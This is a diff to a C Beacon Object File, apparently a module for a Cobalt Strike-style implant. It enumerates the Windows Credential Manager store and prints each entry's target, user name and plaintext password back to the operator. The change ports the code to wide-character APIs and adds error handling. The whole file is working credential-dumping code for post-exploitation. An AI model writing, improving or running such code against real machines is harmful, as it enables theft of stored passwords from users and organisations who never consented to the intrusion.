@@ -1,27 +1,31 @@
 #include <stdio.h>
 #include <windows.h>
 #include <wincred.h>
-#include "beacon.h"
-
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI Advapi32$CredEnumerateA(LPCSTR, DWORD, DWORD*, PCREDENTIAL**);
-DECLSPEC_IMPORT WINBASEAPI VOID WINAPI Advapi32$CredFree(PVOID);
+#include "../includes/beacon.h"
+#include "../includes/bofdefs.h"
 
 void go() {
     DWORD count;
-    PCREDENTIAL* creds;
+    PCREDENTIALW * creds;
 
-    if (!Advapi32$CredEnumerateA(NULL, 0, &count, &creds)) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Error enumerating credentials: %d\n");
-        return;
+    if (!Advapi32$CredEnumerateW(NULL, 0, &count, &creds)) {
+        if (Kernel32$GetLastError() == 1168) {
+            BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Credential Manager empty.");
+            return;
+        } else {
+            BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Could not enumerate credentials. Error code: %d\n", Kernel32$GetLastError());
+            return;
+        }
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT,"Found %d credentials:\n", count);
+    BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Found %d credentials:\n", count);
     for (DWORD i = 0; i < count; i++) {
-        BeaconPrintf(CALLBACK_OUTPUT,"  Target Name: %s\n", creds[i]->TargetName);
-        BeaconPrintf(CALLBACK_OUTPUT,"  User Name: %s\n", creds[i]->UserName);
-        BeaconPrintf(CALLBACK_OUTPUT,"  Password: %.*s\n", creds[i]->CredentialBlobSize, creds[i]->CredentialBlob);
+        BeaconPrintf(CALLBACK_OUTPUT,"  Target Name: %ls\n", creds[i]->TargetName ? creds[i]->TargetName : L"[None]");
+        BeaconPrintf(CALLBACK_OUTPUT,"  User Name: %ls\n", creds[i]->UserName ? creds[i]->UserName : L"[None]");
+        BeaconPrintf(CALLBACK_OUTPUT,"  Password: %.*ls\n", (creds[i]->CredentialBlobSize / sizeof(wchar_t)), (wchar_t *) creds[i]->CredentialBlob);
         BeaconPrintf(CALLBACK_OUTPUT,"\n");
     }
-
-    Advapi32$CredFree(creds);
+    if (creds) {
+        Advapi32$CredFree(creds);
+    }
 }
